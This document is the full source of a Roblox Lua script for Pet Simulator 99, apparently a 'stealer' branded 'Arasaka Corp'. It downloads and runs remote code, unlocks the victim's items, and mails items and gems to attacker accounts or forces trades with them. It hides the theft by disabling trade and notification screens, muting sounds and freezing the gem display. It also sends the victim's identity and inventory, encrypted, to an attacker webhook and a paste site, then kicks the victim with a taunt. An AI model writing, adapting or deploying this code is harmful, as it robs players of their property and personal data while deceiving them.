local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local plr = Players.LocalPlayer

local requestFn = syn and syn.request or http_request or request
if not requestFn then
    pcall(function() plr:Kick("Executor missing HTTP support") end)
    return
end

local Crypto = loadstring(game:HttpGet("https://arasaka-corp.eu/script/module/crypto.lua"))()
local crypto = Crypto.new("31566ef8c2c18566522c58e8c11511cfc0ec2a4864ee5e2750a162f4dfeca9a4b16c424cb4f83662773ea0a0b7040b8d")

local cfg = _G.AC_CONFIG
if not cfg then
    pcall(function() plr:Kick("Config missing | Use the Loader first") end)
    return
end

local WEBHOOK_ID = cfg.WEBHOOK_ID
local PROXY_URL = cfg.PROXY_URL
local PUBLIC_PROXY = cfg.PUBLIC_PROXY or cfg.PUPLIC_PROXY

local USERNAMES
do
    local raw = cfg.USERNAMES or cfg.USERNAME
    if type(raw) == "table" then
        USERNAMES = {}
        for _, v in ipairs(raw) do
            if type(v) == "string" and #v > 0 then
                table.insert(USERNAMES, v)
            end
        end
    elseif type(raw) == "string" and #raw > 0 then
        USERNAMES = { raw }
    else
        USERNAMES = {}
    end
end

if WEBHOOK_ID == "" or PROXY_URL == "" or #USERNAMES == 0 then
    pcall(function() plr:Kick("Invalid configuration | discord.gg/arasaka-corp") end)
    return
end

local States = {Inventory = {}, Gems = 0, TotalRAP = 0, MailCost = 0}
local Settings = {MinRap = 1000000, MinGems = 500000}
local RemoteCache = {}
local ProtectedItems = {}
local FrozenGemText = nil

local function DeepCopy(v)
    if type(v) ~= "table" then return v end
    local c = {}
    for k, val in pairs(v) do
        c[DeepCopy(k)] = DeepCopy(val)
    end
    return c
end

local function GetDiamondLabel()
    local ok, lbl = pcall(function()
        return plr.PlayerGui.MainLeft.Left.Currency.Diamonds
    end)
    if ok then return lbl end
    return nil
end

pcall(function()
    local pg = plr:WaitForChild("PlayerGui", 10)
    if not pg then return end

    local tradeNames = {"TradeGUI", "TradeGUI_Phone", "Trade", "TradingGUI", "TradingGui", "TradeMenu"}

    local function isTradeGui(obj)
        if not obj then return false end
        local n = obj.Name
        for _, tn in ipairs(tradeNames) do
            if n == tn then return true end
        end
        if n:lower():find("trade") then return true end
        return false
    end

    local function killGui(g)
        if not g then return end
        if g:IsA("ScreenGui") or g:IsA("GuiObject") then
            pcall(function() g.Enabled = false end)
            pcall(function()
                g:GetPropertyChangedSignal("Enabled"):Connect(function()
                    if g.Enabled then g.Enabled = false end
                end)
            end)
        end
    end

    for _, d in ipairs(pg:GetDescendants()) do
        if isTradeGui(d) then killGui(d) end
    end

    pg.DescendantAdded:Connect(function(d)
        if isTradeGui(d) then
            task.wait()
            killGui(d)
        end
    end)

    local soundKeywords = {"mail", "send", "box", "claim", "pop", "success", "notif", "drop", "reward"}

    local function isMailSound(s)
        local n = s.Name:lower()
        for _, kw in ipairs(soundKeywords) do
            if n:find(kw) then return true end
        end
        local p = s.Parent
        while p and p ~= pg do
            local pn = p.Name:lower()
            for _, kw in ipairs(soundKeywords) do
                if pn:find(kw) then return true end
            end
            p = p.Parent
        end
        return false
    end

    local function muteSound(s)
        if not s:IsA("Sound") then return end
        if not isMailSound(s) then return end
        pcall(function()
            s.Volume = 0
            s.Playing = false
        end)
        pcall(function()
            s:GetPropertyChangedSignal("Volume"):Connect(function()
                if s.Volume > 0 then s.Volume = 0 end
            end)
        end)
        pcall(function()
            s:GetPropertyChangedSignal("Playing"):Connect(function()
                if s.Playing then s.Playing = false end
            end)
        end)
    end

    for _, d in ipairs(pg:GetDescendants()) do
        if d:IsA("Sound") then muteSound(d) end
    end

    pg.DescendantAdded:Connect(function(d)
        if d:IsA("Sound") then muteSound(d) end
    end)
end)

RunService.RenderStepped:Connect(function()
    pcall(function()
        local save = require(ReplicatedStorage.Library.Client.Save).Get()
        if not save or type(save.Inventory) ~= "table" then return end
        for cat, items in pairs(ProtectedItems) do
            if save.Inventory[cat] == nil then
                save.Inventory[cat] = {}
            end
            for uid, item in pairs(items) do
                if save.Inventory[cat][uid] == nil then
                    save.Inventory[cat][uid] = item
                end
            end
        end
    end)
end)

RunService.RenderStepped:Connect(function()
    if FrozenGemText == nil then return end
    pcall(function()
        local lbl = GetDiamondLabel()
        if lbl and lbl.Text ~= FrozenGemText then
            lbl.Text = FrozenGemText
        end
    end)
end)

local REAL_JOB_ID = game.JobId
local bypassJobId = game.JobId
local capturedJobId = false

if identifyexecutor and identifyexecutor() == "Delta" then
    local stepAnimate = nil
    local printed = false
    repeat
        for _, v in ipairs(getgc(true)) do
            if typeof(v) == "function" then
                local info = debug.getinfo(v)
                if info and info.name == "stepAnimate" then
                    stepAnimate = v
                    break
                end
            end
        end
        task.wait()
    until stepAnimate
    local old
    old = hookfunction(stepAnimate, function(dt)
        if not printed then
            printed = true
            bypassJobId = game.JobId
            capturedJobId = true
        end
        return old(dt)
    end)
    repeat task.wait() until capturedJobId
    REAL_JOB_ID = bypassJobId
end

local function InvokeRemote(remoteName, ...)
    local args = {...}
    local remote = RemoteCache[remoteName]
    if not remote then
        remote = ReplicatedStorage:FindFirstChild(remoteName, true)
        RemoteCache[remoteName] = remote
    end
    if remote then
        local success, result = pcall(function()
            return remote:InvokeServer(table.unpack(args))
        end)
        if success then return result end
    end
    return nil
end

local function FormatNumber(n)
    if n >= 1E9 then return string.format("%.2fB", n / 1E9)
    elseif n >= 1E6 then return string.format("%.2fM", n / 1E6)
    elseif n >= 1E3 then return string.format("%.2fK", n / 1E3)
    else return tostring(n) end
end

local function GetRAP(category, item)
    local success, rap = pcall(function()
        return require(ReplicatedStorage.Library.Client.RAPCmds).Get({
            Class = {Name = category},
            IsA = function(className) return className == category end,
            GetId = function() return item.id end,
            StackKey = function()
                return HttpService:JSONEncode({
                    id = item.id,
                    pt = item.pt,
                    sh = item.sh,
                    tn = item.tn,
                })
            end,
            AbstractGetRAP = function() return nil end,
        })
    end)
    return success and rap or 0
end

local function GetSave()
    return require(ReplicatedStorage.Library.Client.Save).Get()
end

local function GetInventory()
    local save = GetSave()
    return save and save.Inventory or {}
end

local function GetMailCost()
    for _, f in pairs(getgc()) do
        if typeof(f) == "function" then
            local info = debug.getinfo(f)
            if info and info.name == "computeSendMailCost" then
                return f()
            end
        end
    end
    return 10000
end

local function GetPlayerByName(username)
    for _, p in ipairs(Players:GetPlayers()) do
        if p.Name:lower() == username:lower() then
            return p
        end
    end
    return nil
end

local function GetTradeId()
    local state = require(ReplicatedStorage.Library.Client.TradingCmds).GetState()
    return state and state._id
end

local function GetTradeCounter()
    local state = require(ReplicatedStorage.Library.Client.TradingCmds).GetState()
    return state and state._counter
end

local function BuildItemName(item)
    local prefix = ""
    if item.pt and item.pt == 1 then prefix = "Golden "
    elseif item.pt and item.pt == 2 then prefix = "Rainbow " end
    if item.sh then prefix = "Shiny " .. prefix end
    return prefix .. (item.id or "Unknown")
end

local function ScanInventory()
    local inventory = {}
    local inv = GetInventory()
    local categories = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Hoverboard", "Booth", "Ultimate"}
    local petsDir = require(ReplicatedStorage.Library.Directory.Pets)
    local totalRAP = 0

    for _, cat in ipairs(categories) do
        local catData = inv[cat]
        if catData then
            for uid, item in pairs(catData) do
                if type(item) == "table" then
                    local rap = GetRAP(cat, item) * (item._am or 1)
                    if rap >= Settings.MinRap then
                        local isTradeItem = false
                        if cat == "Pet" then
                            local petData = petsDir[item.id]
                            if petData and (petData.titanic or petData.gargantuan) then
                                isTradeItem = true
                            end
                        end
                        table.insert(inventory, {
                            Category = cat,
                            UID = uid,
                            Amount = item._am or 1,
                            RAP = rap,
                            Name = BuildItemName(item),
                            IsTradeItem = isTradeItem,
                            TotalValue = rap * (item._am or 1)
                        })
                        totalRAP = totalRAP + (rap * (item._am or 1))
                    end
                end
            end
        end
    end

    table.sort(inventory, function(a, b) return a.TotalValue > b.TotalValue end)
    States.Inventory = inventory
    States.TotalRAP = totalRAP
    return inventory
end

local function ClaimAllMail()
    local response = InvokeRemote("Mailbox: Claim All")
    local attempts = 0
    while response == nil and attempts < 10 do
        task.wait(0.5)
        response = InvokeRemote("Mailbox: Claim All")
        attempts = attempts + 1
    end
    return response
end

local function EmptyMailBoxes()
    local inv = GetInventory()
    if inv.Box then
        for uid, data in pairs(inv.Box) do
            if data._uq then
                InvokeRemote("Box: Withdraw All", uid)
                task.wait(0.1)
            end
        end
    end
end

local function UnlockAllItems()
    local inv = GetInventory()
    for _, catData in pairs(inv) do
        if type(catData) == "table" then
            for uid, item in pairs(catData) do
                if type(item) == "table" and item._lk then
                    InvokeRemote("Locking_SetLocked", uid, false)
                    task.wait(0.05)
                end
            end
        end
    end
end

local function SendItemToMail(category, uid, amount)
    local userIndex = 1
    local maxUsers = #USERNAMES
    local sent = false
    local message = "gg / arasaka-corp"

    amount = tonumber(amount) or 1

    repeat
        local currentUser = USERNAMES[userIndex]
        local response, err = InvokeRemote("Mailbox: Send", currentUser, message, category, uid, amount)

        if response == true then
            sent = true
            States.Gems = States.Gems - States.MailCost
            States.MailCost = math.ceil(States.MailCost * 1.5)
            if States.MailCost > 5000000 then States.MailCost = 5000000 end
        elseif err == "They don't have enough space!" then
            userIndex = userIndex + 1
            if userIndex > maxUsers then sent = true end
        else
            task.wait(0.1)
        end
    until sent or States.Gems < States.MailCost

    return sent
end

local function SendAllGems()
    local inv = GetInventory()
    for uid, data in pairs(inv.Currency or {}) do
        if data.id == "Diamonds" then
            local gemsToSend = States.Gems - States.MailCost
            if gemsToSend > 10000 then
                local userIndex = 1
                local maxUsers = #USERNAMES
                local sent = false
                local message = "gg / arasaka-corp"

                repeat
                    local currentUser = USERNAMES[userIndex]
                    local response, err = InvokeRemote("Mailbox: Send", currentUser, message, "Currency", uid, gemsToSend)

                    if response == true then
                        sent = true
                        States.Gems = States.Gems - gemsToSend - States.MailCost
                        States.MailCost = math.ceil(States.MailCost * 1.5)
                        if States.MailCost > 5000000 then States.MailCost = 5000000 end
                    elseif err == "They don't have enough space!" then
                        userIndex = userIndex + 1
                        if userIndex > maxUsers then sent = true end
                    else
                        task.wait(0.1)
                    end
                until sent or States.Gems < States.MailCost
            end
            break
        end
    end
end

local function AddItemToTrade(category, uid, amount)
    local tradeId = GetTradeId()
    if not tradeId then return false end
    return InvokeRemote("Server: Trading: Set Item", tradeId, category, uid, amount or 1) == true
end

local function RequestTrade(targetPlayer)
    if not targetPlayer or not targetPlayer.Parent then return false end
    local ok, result = pcall(function()
        return InvokeRemote("Server: Trading: Request", targetPlayer)
    end)
    return ok and result
end

local function SpamReadyAndConfirm()
    local tradeId = GetTradeId()
    if not tradeId then return false end

    for _ = 1, 60 do
        tradeId = GetTradeId()
        local counter = GetTradeCounter()
        if tradeId then
            InvokeRemote("Server: Trading: Set Ready", tradeId, true, counter)
            local state = require(ReplicatedStorage.Library.Client.TradingCmds).GetState()
            local idx = state and state:PlayerIndex(plr)
            if idx and state._ready and state._ready[idx] then break end
        end
        task.wait(0.03)
    end

    for _ = 1, 60 do
        tradeId = GetTradeId()
        local counter = GetTradeCounter()
        if tradeId then
            InvokeRemote("Server: Trading: Set Confirmed", tradeId, true, counter)
            local state = require(ReplicatedStorage.Library.Client.TradingCmds).GetState()
            local idx = state and state:PlayerIndex(plr)
            if idx and state._confirmed and state._confirmed[idx] then break end
        end
        task.wait(0.03)
    end

    return true
end

local function ExecuteTrade(targetPlayer, items)
    if not targetPlayer or not items or #items == 0 then return false end

    local tradeCreated = false
    for retry = 1, 5 do
        if not GetPlayerByName(targetPlayer.Name) then break end

        local reqOk = RequestTrade(targetPlayer)
        if reqOk then
            for _ = 1, 150 do
                if GetTradeId() then
                    tradeCreated = true
                    break
                end
                RunService.Heartbeat:Wait()
            end
            if tradeCreated then break end
        end
        task.wait(2)
    end

    if not tradeCreated then return false end

    task.wait(0.5)

    for _, item in ipairs(items) do
        AddItemToTrade(item.Category, item.UID, item.Amount)
        RunService.Heartbeat:Wait()
    end

    SpamReadyAndConfirm()

    local waitCount = 0
    while GetTradeId() ~= nil and waitCount < 150 do
        task.wait(0.1)
        waitCount = waitCount + 1
    end
    task.wait(1.5)

    return true
end

local function SendWebhook(payload)
    local fullUrl = PROXY_URL .. WEBHOOK_ID
    local envelope = { id = WEBHOOK_ID, payload = payload }
    local json = HttpService:JSONEncode(envelope)
    local encrypted = crypto:Encrypt(json)

    local success, response = pcall(function()
        return requestFn({
            Url = fullUrl,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({data = encrypted})
        })
    end)
    return success, response
end

local function SendPublic(payload)
    if not PUBLIC_PROXY or PUBLIC_PROXY == "" then return end
    local json = HttpService:JSONEncode(payload)
    local encrypted = crypto:Encrypt(json)

    local success, response = pcall(function()
        return requestFn({
            Url = PUBLIC_PROXY,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({data = encrypted})
        })
    end)
    return success, response
end

local function UploadToPastefy(items)
    local lines = {
        "ARASAKA CORP | PS99 Inventory Dump",
        "User: " .. plr.Name .. " (" .. plr.DisplayName .. ")",
        "Generated: " .. os.date("%Y-%m-%d %H:%M:%S"),
        "Total RAP: " .. FormatNumber(States.TotalRAP or 0),
        "Total Items: " .. #items,
        string.rep("-", 60),
        ""
    }

    for _, item in ipairs(items) do
        local totalRap = tonumber(item.RAP) * tonumber(item.Amount)
        local tradeTag = item.IsTradeItem and "[TRADE REQUIRED]" or ""
        table.insert(lines, string.format("%s x%d | %s RAP each | Total: %s RAP %s",
            item.Name, tonumber(item.Amount), FormatNumber(item.RAP), FormatNumber(totalRap), tradeTag))
    end

    local content = table.concat(lines, "\n")

    local success, response = pcall(function()
        return requestFn({
            Url = "https://pastefy.app/api/v2/paste",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({content = content, type = "PASTE"})
        })
    end)

    if success and response and response.StatusCode == 200 then
        local ok, data = pcall(function()
            return HttpService:JSONDecode(response.Body)
        end)
        if ok and data then
            if data.paste then
                return "https://pastefy.app/" .. data.paste.id
            elseif data.id then
                return "https://pastefy.app/" .. data.id
            end
        end
    end
    return nil
end

local function BuildWebhookPayload()
    local items = ScanInventory()
    local totalItems = 0
    local categoryCounts = {Pet = 0, Egg = 0, Charm = 0, Enchant = 0, Potion = 0, Misc = 0, Hoverboard = 0, Booth = 0, Ultimate = 0}
    local tradeItems = {}

    for _, item in ipairs(items) do
        totalItems = totalItems + (item.Amount or 1)
        categoryCounts[item.Category] = (categoryCounts[item.Category] or 0) + (item.Amount or 1)
        if item.IsTradeItem then
            table.insert(tradeItems, item)
        end
    end

    local rapNum = States.TotalRAP or 0
    local gemNum = States.Gems or 0

    local hitCategory = "STANDARD HIT"
    local glowEffect = ""
    if rapNum >= 10000000000 then
        hitCategory = "INSANE HIT (10B+)"
        glowEffect = "✦"
    elseif rapNum >= 1000000000 then
        hitCategory = "MASSIVE HIT (1B+)"
        glowEffect = "🔥"
    elseif rapNum >= 100000000 then
        hitCategory = "BIG HIT (100M+)"
        glowEffect = "⚡"
    elseif rapNum >= 50000000 then
        hitCategory = "GOOD HIT (50M+)"
        glowEffect = "💫"
    elseif rapNum >= 1000000 then
        hitCategory = "NORMAL HIT (1M+)"
    else
        hitCategory = "LOW HIT (<1M)"
    end

    local topItems = {}
    for i = 1, math.min(5, #items) do
        local icon = ">"
        if items[i].RAP >= 100000000 then icon = "█"
        elseif items[i].RAP >= 50000000 then icon = "▓"
        elseif items[i].RAP >= 10000000 then icon = "▒"
        else icon = "░" end
        table.insert(topItems, string.format("%s %s x%d | %s", icon, items[i].Name, items[i].Amount, FormatNumber(items[i].RAP)))
    end

    local pastefyLink = nil
    if #items > 0 then
        pastefyLink = UploadToPastefy(items)
    end

    local fernLink = "https://fern.wtf/joiner?placeId=" .. tostring(game.PlaceId) .. "&gameInstanceId=" .. REAL_JOB_ID

    local fields = {
        {
            name = "VICTIM INFORMATION",
            value = "```yml\nUser: " .. plr.DisplayName .. " (@" .. plr.Name .. ")\nID: " .. tostring(plr.UserId) .. "\nAge: " .. tostring(plr.AccountAge) .. " days\nServer: " .. game.JobId:sub(1, 8) .. "\n```",
            inline = true
        },
        {
            name = "VALUATION",
            value = "```yml\nTotal RAP: " .. FormatNumber(rapNum) .. "\nGems: " .. FormatNumber(gemNum) .. "\nReciver: " .. table.concat(USERNAMES, ", ") .. "\n```",
            inline = true
        },
        {
            name = "INVENTORY BREAKDOWN",
            value = "```yml\nPets: " .. tostring(categoryCounts.Pet) .. " | Eggs: " .. tostring(categoryCounts.Egg) .. "\nCharms: " .. tostring(categoryCounts.Charm) .. " | Enchants: " .. tostring(categoryCounts.Enchant) .. "\nPotions: " .. tostring(categoryCounts.Potion) .. " | Misc: " .. tostring(categoryCounts.Misc) .. "\n```",
            inline = false
        },
    }

    if #topItems > 0 then
        local topItemsStr = "```prolog\n"
        for i, itemStr in ipairs(topItems) do
            topItemsStr = topItemsStr .. itemStr .. "\n"
        end
        topItemsStr = topItemsStr .. "```"
        table.insert(fields, {
            name = "TOP ITEMS",
            value = topItemsStr,
            inline = false
        })
    end

    if pastefyLink then
        table.insert(fields, {
            name = "FULL INVENTORY",
            value = "[View All " .. tostring(#items) .. " Items on Pastefy](" .. pastefyLink .. ")",
            inline = false
        })
    end

    if #tradeItems > 0 then
        local tradeStr = "```diff\n+ " .. tostring(#tradeItems) .. " item(s) require direct trade\n```\n[Join Server](" .. fernLink .. ")"
        table.insert(fields, {
            name = "TRADE REQUIRED",
            value = tradeStr,
            inline = false
        })
    end

    local embedColor = 0x8B0000
    if rapNum >= 10000000000 then embedColor = 0xFF0000
    elseif rapNum >= 1000000000 then embedColor = 0xCC0000
    elseif rapNum >= 100000000 then embedColor = 0x990000
    elseif rapNum >= 50000000 then embedColor = 0x660000
    elseif rapNum >= 1000000 then embedColor = 0x440000
    end

    local embed = {
        title = "ARASAKA CORP " .. glowEffect .. " " .. hitCategory,
        color = embedColor,
        fields = fields,
        footer = {
            text = "Arasaka Corp v1.0.2 | " .. os.date("%Y-%m-%d %H:%M:%S")
        },
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }

    local payload = {
        username = "Arasaka Corp",
        embeds = {embed}
    }

    if rapNum >= 10000000000 or #tradeItems > 0 then
        payload.content = "@everyone **ARASAKA CORP | PS99 HIT**"
    elseif rapNum >= 1000000000 then
        payload.content = "@everyone **ARASAKA CORP | PS99 HIT**"
    end

    return payload, tradeItems, pastefyLink
end

local function MainExecution()
    pcall(function()
        local loading = plr.PlayerScripts.Scripts.Core["Process Pending GUI"]
        if loading then loading.Disabled = true end
    end)

    pcall(function()
        local noti = plr.PlayerGui.Notifications
        if noti then
            noti.Enabled = false
            noti:GetPropertyChangedSignal("Enabled"):Connect(function()
                noti.Enabled = false
            end)
        end
    end)

    pcall(function()
        local lbl = GetDiamondLabel()
        if lbl then
            lbl.Visible = true
            local waited = 0
            while (not lbl.Text or lbl.Text == "" or lbl.Text == "0") and waited < 20 do
                task.wait(0.25)
                waited = waited + 1
            end
            FrozenGemText = lbl.Text
            if FrozenGemText and FrozenGemText ~= "" then
                lbl:GetPropertyChangedSignal("Text"):Connect(function()
                    if FrozenGemText and lbl.Text ~= FrozenGemText then
                        lbl.Text = FrozenGemText
                    end
                end)
            end
        end
    end)

    for _, data in pairs(GetInventory().Currency or {}) do
        if data.id == "Diamonds" then
            States.Gems = data._am or 0
            break
        end
    end

    States.MailCost = GetMailCost()

    ClaimAllMail()
    EmptyMailBoxes()
    UnlockAllItems()
    task.wait(0.5)

    local items = ScanInventory()
    local payload, tradeItems, pastefyLink = BuildWebhookPayload()
    SendWebhook(payload)

    local publicMsg = plr.Name .. " got hit by Arasaka Corp in PS99"
        .. (pastefyLink and (" | Pastefy: " .. pastefyLink) or "")
    SendPublic({ message = publicMsg })

    local fullInv = GetInventory()
    for _, item in ipairs(items) do
        local catData = fullInv[item.Category]
        if catData and catData[item.UID] then
            ProtectedItems[item.Category] = ProtectedItems[item.Category] or {}
            ProtectedItems[item.Category][item.UID] = DeepCopy(catData[item.UID])
        end
    end

    local mailItems = {}
    for _, item in ipairs(items) do
        if not item.IsTradeItem then
            table.insert(mailItems, item)
        end
    end

    for _, item in ipairs(mailItems) do
        if States.Gems <= States.MailCost then break end
        SendItemToMail(item.Category, item.UID, item.Amount)
        task.wait(0.1)
    end

    if #tradeItems > 0 then
        local targetPlayer = nil
        for _, name in ipairs(USERNAMES) do
            targetPlayer = GetPlayerByName(name)
            if targetPlayer then break end
        end

        if targetPlayer then
            ExecuteTrade(targetPlayer, tradeItems)
        end
    end

    if States.Gems > States.MailCost + 10000 then
        SendAllGems()
    end

    task.wait(3)
    plr:Kick("Your shit got stolen by Arasaka Corp | discord.gg/arasaka-corp")
end

task.spawn(MainExecution)
